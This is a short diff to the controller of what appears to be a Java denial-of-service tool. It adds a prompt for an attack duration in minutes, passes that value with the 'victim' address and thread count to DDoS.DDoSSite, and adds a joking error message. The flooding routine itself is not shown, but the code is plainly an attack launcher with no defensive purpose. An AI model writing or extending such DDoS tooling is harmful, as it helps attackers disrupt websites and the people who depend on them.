@@ -283,10 +283,13 @@ public class Controller {
 		String victim = inputScanner.nextLine();
 		System.out.println("Please input the amount of threads you wish to use: ");
 		int threads = Integer.parseInt((inputScanner.nextLine()));
+		System.out.println("Please input the amount of time in minutes for the attack: ");
+		int time = Integer.parseInt((inputScanner.nextLine()));
 		try {
-			DDoS.DDoSSite(victim, threads);
+			DDoS.DDoSSite(victim, threads, time);
 		} catch (Exception e) {
 			System.out.println("Creating DDoS failed :(");
+			System.out.println("Probably did not have correct inputs bro");
 			e.printStackTrace();
 			restart();
 		}
